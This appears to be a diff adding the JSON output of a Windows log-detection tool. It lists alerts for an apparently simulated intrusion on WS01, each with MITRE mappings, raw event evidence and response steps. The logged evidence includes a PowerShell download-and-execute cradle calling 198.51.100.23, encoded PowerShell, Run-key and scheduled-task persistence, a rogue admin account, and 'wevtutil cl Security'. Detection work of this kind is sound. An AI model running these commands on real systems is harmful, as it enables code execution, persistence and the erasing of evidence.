+        "raw": "{\"TimeCreated\": \"2026-10-14T10:20:40Z\", \"EventID\": 4625, \"Computer\": \"WS01.corp.local\", \"TargetUserName\": \"Administrator\", \"TargetDomainName\": \"WS01\", \"LogonType\": 3, \"IpAddress\": \"198.51.100.23\", \"IpPort\": \"49811\", \"Status\": \"0xc000006d\", \"SubStatus\": \"0xc000006a\", \"WorkstationName\": \"kali\"}"
+      }
+    ],
+    "response": [
+      "Check for a successful logon (4624) from the same IP afterwards.",
+      "Block the IP; RDP should never be exposed directly to the internet.",
+      "Confirm account lockout policy is enabled."
+    ]
+  },
+  {
+    "rule_id": "win_logon_after_bruteforce",
+    "title": "Successful Windows logon after brute force",
+    "severity": "critical",
+    "mitre": {
+      "tactic": "Initial Access",
+      "technique_id": "T1078",
+      "technique": "Valid Accounts"
+    },
+    "first_seen": "2026-10-14T10:20:02+00:00",
+    "last_seen": "2026-10-14T10:21:20+00:00",
+    "hosts": [
+      "WS01.corp.local"
+    ],
+    "group": {
+      "src_ip": "198.51.100.23"
+    },
+    "summary": "12 matching events, then logon_success as Administrator at 10:21:20 (src_ip=198.51.100.23)",
+    "event_count": 13,
+    "decoded_command": null,
+    "evidence": [
+      {
+        "timestamp": "2026-10-14T10:20:02+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 8,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:20:02Z\", \"EventID\": 4625, \"Computer\": \"WS01.corp.local\", \"TargetUserName\": \"Administrator\", \"TargetDomainName\": \"WS01\", \"LogonType\": 3, \"IpAddress\": \"198.51.100.23\", \"IpPort\": \"49800\", \"Status\": \"0xc000006d\", \"SubStatus\": \"0xc000006a\", \"WorkstationName\": \"kali\"}"
+      },
+      {
+        "timestamp": "2026-10-14T10:20:06+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 9,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:20:06Z\", \"EventID\": 4625, \"Computer\": \"WS01.corp.local\", \"TargetUserName\": \"Administrator\", \"TargetDomainName\": \"WS01\", \"LogonType\": 3, \"IpAddress\": \"198.51.100.23\", \"IpPort\": \"49801\", \"Status\": \"0xc000006d\", \"SubStatus\": \"0xc000006a\", \"WorkstationName\": \"kali\"}"
+      },
+      {
+        "timestamp": "2026-10-14T10:20:09+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 10,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:20:09Z\", \"EventID\": 4625, \"Computer\": \"WS01.corp.local\", \"TargetUserName\": \"Administrator\", \"TargetDomainName\": \"WS01\", \"LogonType\": 3, \"IpAddress\": \"198.51.100.23\", \"IpPort\": \"49802\", \"Status\": \"0xc000006d\", \"SubStatus\": \"0xc000006a\", \"WorkstationName\": \"kali\"}"
+      },
+      {
+        "timestamp": "2026-10-14T10:20:12+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 11,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:20:12Z\", \"EventID\": 4625, \"Computer\": \"WS01.corp.local\", \"TargetUserName\": \"Administrator\", \"TargetDomainName\": \"WS01\", \"LogonType\": 3, \"IpAddress\": \"198.51.100.23\", \"IpPort\": \"49803\", \"Status\": \"0xc000006d\", \"SubStatus\": \"0xc000006a\", \"WorkstationName\": \"kali\"}"
+      },
+      {
+        "timestamp": "2026-10-14T10:20:15+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 12,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:20:15Z\", \"EventID\": 4625, \"Computer\": \"WS01.corp.local\", \"TargetUserName\": \"Administrator\", \"TargetDomainName\": \"WS01\", \"LogonType\": 3, \"IpAddress\": \"198.51.100.23\", \"IpPort\": \"49804\", \"Status\": \"0xc000006d\", \"SubStatus\": \"0xc000006a\", \"WorkstationName\": \"kali\"}"
+      },
+      {
+        "timestamp": "2026-10-14T10:20:19+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 13,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:20:19Z\", \"EventID\": 4625, \"Computer\": \"WS01.corp.local\", \"TargetUserName\": \"Administrator\", \"TargetDomainName\": \"WS01\", \"LogonType\": 3, \"IpAddress\": \"198.51.100.23\", \"IpPort\": \"49805\", \"Status\": \"0xc000006d\", \"SubStatus\": \"0xc000006a\", \"WorkstationName\": \"kali\"}"
+      },
+      {
+        "timestamp": "2026-10-14T10:20:22+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 14,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:20:22Z\", \"EventID\": 4625, \"Computer\": \"WS01.corp.local\", \"TargetUserName\": \"Administrator\", \"TargetDomainName\": \"WS01\", \"LogonType\": 3, \"IpAddress\": \"198.51.100.23\", \"IpPort\": \"49806\", \"Status\": \"0xc000006d\", \"SubStatus\": \"0xc000006a\", \"WorkstationName\": \"kali\"}"
+      },
+      {
+        "timestamp": "2026-10-14T10:20:25+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 15,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:20:25Z\", \"EventID\": 4625, \"Computer\": \"WS01.corp.local\", \"TargetUserName\": \"Administrator\", \"TargetDomainName\": \"WS01\", \"LogonType\": 3, \"IpAddress\": \"198.51.100.23\", \"IpPort\": \"49807\", \"Status\": \"0xc000006d\", \"SubStatus\": \"0xc000006a\", \"WorkstationName\": \"kali\"}"
+      },
+      {
+        "timestamp": "2026-10-14T10:20:28+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 16,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:20:28Z\", \"EventID\": 4625, \"Computer\": \"WS01.corp.local\", \"TargetUserName\": \"Administrator\", \"TargetDomainName\": \"WS01\", \"LogonType\": 3, \"IpAddress\": \"198.51.100.23\", \"IpPort\": \"49808\", \"Status\": \"0xc000006d\", \"SubStatus\": \"0xc000006a\", \"WorkstationName\": \"kali\"}"
+      },
+      {
+        "timestamp": "2026-10-14T10:20:31+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 17,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:20:31Z\", \"EventID\": 4625, \"Computer\": \"WS01.corp.local\", \"TargetUserName\": \"Administrator\", \"TargetDomainName\": \"WS01\", \"LogonType\": 3, \"IpAddress\": \"198.51.100.23\", \"IpPort\": \"49809\", \"Status\": \"0xc000006d\", \"SubStatus\": \"0xc000006a\", \"WorkstationName\": \"kali\"}"
+      },
+      {
+        "timestamp": "2026-10-14T10:20:36+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 18,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:20:36Z\", \"EventID\": 4625, \"Computer\": \"WS01.corp.local\", \"TargetUserName\": \"Administrator\", \"TargetDomainName\": \"WS01\", \"LogonType\": 3, \"IpAddress\": \"198.51.100.23\", \"IpPort\": \"49810\", \"Status\": \"0xc000006d\", \"SubStatus\": \"0xc000006a\", \"WorkstationName\": \"kali\"}"
+      },
+      {
+        "timestamp": "2026-10-14T10:20:40+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 19,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:20:40Z\", \"EventID\": 4625, \"Computer\": \"WS01.corp.local\", \"TargetUserName\": \"Administrator\", \"TargetDomainName\": \"WS01\", \"LogonType\": 3, \"IpAddress\": \"198.51.100.23\", \"IpPort\": \"49811\", \"Status\": \"0xc000006d\", \"SubStatus\": \"0xc000006a\", \"WorkstationName\": \"kali\"}"
+      },
+      {
+        "timestamp": "2026-10-14T10:21:20+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 20,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:21:20Z\", \"EventID\": 4624, \"Computer\": \"WS01.corp.local\", \"TargetUserName\": \"Administrator\", \"TargetDomainName\": \"WS01\", \"LogonType\": 10, \"IpAddress\": \"198.51.100.23\", \"WorkstationName\": \"kali\"}"
+      }
+    ],
+    "response": [
+      "Disable the compromised account and reset its password.",
+      "Isolate the host and review processes started after the logon (4688).",
+      "Check other hosts for logons by the same account or IP."
+    ]
+  },
+  {
+    "rule_id": "win_encoded_powershell",
+    "title": "Encoded PowerShell command",
+    "severity": "high",
+    "mitre": {
+      "tactic": "Execution",
+      "technique_id": "T1059.001",
+      "technique": "Command and Scripting Interpreter: PowerShell"
+    },
+    "first_seen": "2026-10-14T10:23:05+00:00",
+    "last_seen": "2026-10-14T10:23:05+00:00",
+    "hosts": [
+      "WS01.corp.local"
+    ],
+    "group": {},
+    "summary": "user=Administrator \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoP -W Hidden -Enc dwBoAG8AY\u2026 [decoded: whoami /all; net user; net localgroup administrators]",
+    "event_count": 1,
+    "decoded_command": "whoami /all; net user; net localgroup administrators",
+    "evidence": [
+      {
+        "timestamp": "2026-10-14T10:23:05+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 21,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:23:05Z\", \"EventID\": 4688, \"Computer\": \"WS01.corp.local\", \"SubjectUserName\": \"Administrator\", \"SubjectDomainName\": \"CORP\", \"NewProcessName\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"ParentProcessName\": \"C:\\\\Windows\\\\explorer.exe\", \"CommandLine\": \"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -NoP -W Hidden -Enc dwBoAG8AYQBtAGkAIAAvAGEAbABsADsAIABuAGUAdAAgAHUAcwBlAHIAOwAgAG4AZQB0ACAAbABvAGMAYQBsAGcAcgBvAHUAcAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwA=\"}"
+      }
+    ],
+    "response": [
+      "Decode the Base64 (UTF-16LE) to see the real command.",
+      "Look at the parent process and the account that ran it.",
+      "Check for network connections or new files right after."
+    ]
+  },
+  {
+    "rule_id": "win_powershell_download_cradle",
+    "title": "PowerShell download and execute",
+    "severity": "high",
+    "mitre": {
+      "tactic": "Command and Control",
+      "technique_id": "T1105",
+      "technique": "Ingress Tool Transfer"
+    },
+    "first_seen": "2026-10-14T10:23:41+00:00",
+    "last_seen": "2026-10-14T10:23:41+00:00",
+    "hosts": [
+      "WS01.corp.local"
+    ],
+    "group": {},
+    "summary": "user=Administrator \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoP -C \"IEX (New-Object Net.\u2026",
+    "event_count": 1,
+    "decoded_command": null,
+    "evidence": [
+      {
+        "timestamp": "2026-10-14T10:23:41+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 22,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:23:41Z\", \"EventID\": 4688, \"Computer\": \"WS01.corp.local\", \"SubjectUserName\": \"Administrator\", \"SubjectDomainName\": \"CORP\", \"NewProcessName\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"ParentProcessName\": \"C:\\\\Windows\\\\explorer.exe\", \"CommandLine\": \"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -NoP -C \\\"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')\\\"\"}"
+      }
+    ],
+    "response": [
+      "Find the URL in the command line and block that domain or IP.",
+      "Retrieve what was downloaded (proxy logs, EDR) to understand the tool.",
+      "Isolate the host."
+    ]
+  },
+  {
+    "rule_id": "win_user_created",
+    "title": "New Windows user account created",
+    "severity": "medium",
+    "mitre": {
+      "tactic": "Persistence",
+      "technique_id": "T1136.001",
+      "technique": "Create Account: Local Account"
+    },
+    "first_seen": "2026-10-14T10:25:03+00:00",
+    "last_seen": "2026-10-14T10:25:03+00:00",
+    "hosts": [
+      "WS01.corp.local"
+    ],
+    "group": {},
+    "summary": "user=svc_backup",
+    "event_count": 1,
+    "decoded_command": null,
+    "evidence": [
+      {
+        "timestamp": "2026-10-14T10:25:03+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 23,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:25:03Z\", \"EventID\": 4720, \"Computer\": \"WS01.corp.local\", \"SubjectUserName\": \"Administrator\", \"TargetUserName\": \"svc_backup\", \"TargetDomainName\": \"WS01\"}"
+      }
+    ],
+    "response": [
+      "Confirm the account was expected and who created it (SubjectUserName).",
+      "If not, disable it and investigate the creating account."
+    ]
+  },
+  {
+    "rule_id": "win_added_to_admin_group",
+    "title": "Account added to an administrators group",
+    "severity": "high",
+    "mitre": {
+      "tactic": "Persistence",
+      "technique_id": "T1098",
+      "technique": "Account Manipulation"
+    },
+    "first_seen": "2026-10-14T10:25:30+00:00",
+    "last_seen": "2026-10-14T10:25:30+00:00",
+    "hosts": [
+      "WS01.corp.local"
+    ],
+    "group": {},
+    "summary": "user=svc_backup group=Administrators",
+    "event_count": 1,
+    "decoded_command": null,
+    "evidence": [
+      {
+        "timestamp": "2026-10-14T10:25:30+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 24,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:25:30Z\", \"EventID\": 4732, \"Computer\": \"WS01.corp.local\", \"SubjectUserName\": \"Administrator\", \"TargetUserName\": \"Administrators\", \"MemberName\": \"svc_backup\", \"MemberSid\": \"S-1-5-21-1004336348-1177238915-682003330-1013\"}"
+      }
+    ],
+    "response": [
+      "Verify the change against an approved request.",
+      "If unapproved, remove the member and disable the account."
+    ]
+  },
+  {
+    "rule_id": "win_scheduled_task_created",
+    "title": "Scheduled task created",
+    "severity": "medium",
+    "mitre": {
+      "tactic": "Persistence",
+      "technique_id": "T1053.005",
+      "technique": "Scheduled Task/Job: Scheduled Task"
+    },
+    "first_seen": "2026-10-14T10:27:12+00:00",
+    "last_seen": "2026-10-14T10:27:12+00:00",
+    "hosts": [
+      "WS01.corp.local"
+    ],
+    "group": {},
+    "summary": "user=Administrator task=\\Microsoft\\Windows\\UpdateCheck",
+    "event_count": 1,
+    "decoded_command": null,
+    "evidence": [
+      {
+        "timestamp": "2026-10-14T10:27:12+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 25,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:27:12Z\", \"EventID\": 4698, \"Computer\": \"WS01.corp.local\", \"SubjectUserName\": \"Administrator\", \"TaskName\": \"\\\\Microsoft\\\\Windows\\\\UpdateCheck\", \"TaskContent\": \"C:\\\\Users\\\\Public\\\\upd.exe (trigger: at logon)\"}"
+      }
+    ],
+    "response": [
+      "Review the task's action (what it runs) and who created it.",
+      "Delete the task if it is malicious and remove the file it runs."
+    ]
+  },
+  {
+    "rule_id": "win_run_key_persistence",
+    "title": "Registry Run key added",
+    "severity": "high",
+    "mitre": {
+      "tactic": "Persistence",
+      "technique_id": "T1547.001",
+      "technique": "Boot or Logon Autostart Execution: Registry Run Keys"
+    },
+    "first_seen": "2026-10-14T10:28:02+00:00",
+    "last_seen": "2026-10-14T10:28:02+00:00",
+    "hosts": [
+      "WS01.corp.local"
+    ],
+    "group": {},
+    "summary": "user=Administrator reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Use\u2026",
+    "event_count": 1,
+    "decoded_command": null,
+    "evidence": [
+      {
+        "timestamp": "2026-10-14T10:28:02+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 26,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:28:02Z\", \"EventID\": 4688, \"Computer\": \"WS01.corp.local\", \"SubjectUserName\": \"Administrator\", \"SubjectDomainName\": \"CORP\", \"NewProcessName\": \"C:\\\\Windows\\\\System32\\\\reg.exe\", \"ParentProcessName\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": \"reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v Updater /t REG_SZ /d C:\\\\Users\\\\Public\\\\upd.exe /f\"}"
+      }
+    ],
+    "response": [
+      "Check the value's target file; remove the Run value and the file if malicious.",
+      "Look for the same value on other hosts."
+    ]
+  },
+  {
+    "rule_id": "win_security_log_cleared",
+    "title": "Security event log cleared",
+    "severity": "high",
+    "mitre": {
+      "tactic": "Defense Evasion",
+      "technique_id": "T1070.001",
+      "technique": "Indicator Removal: Clear Windows Event Logs"
+    },
+    "first_seen": "2026-10-14T10:30:45+00:00",
+    "last_seen": "2026-10-14T10:30:45+00:00",
+    "hosts": [
+      "WS01.corp.local"
+    ],
+    "group": {},
+    "summary": "user=Administrator wevtutil cl Security",
+    "event_count": 1,
+    "decoded_command": null,
+    "evidence": [
+      {
+        "timestamp": "2026-10-14T10:30:45+00:00",
+        "file": "ws01_security.jsonl",
+        "line": 27,
+        "raw": "{\"TimeCreated\": \"2026-10-14T10:30:45Z\", \"EventID\": 4688, \"Computer\": \"WS01.corp.local\", \"SubjectUserName\": \"Administrator\", \"SubjectDomainName\": \"CORP\", \"NewProcessName\": \"C:\\\\Windows\\\\System32\\\\wevtutil.exe\", \"ParentProcessName\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": \"wevtutil cl Security\"}"
+      }
+    ],
+    "response": [
+      "Assume the attacker had admin rights; escalate the incident.",
+      "Recover logs from a central SIEM or log forwarder, which the attacker could not clear."
+    ]
+  }
+]
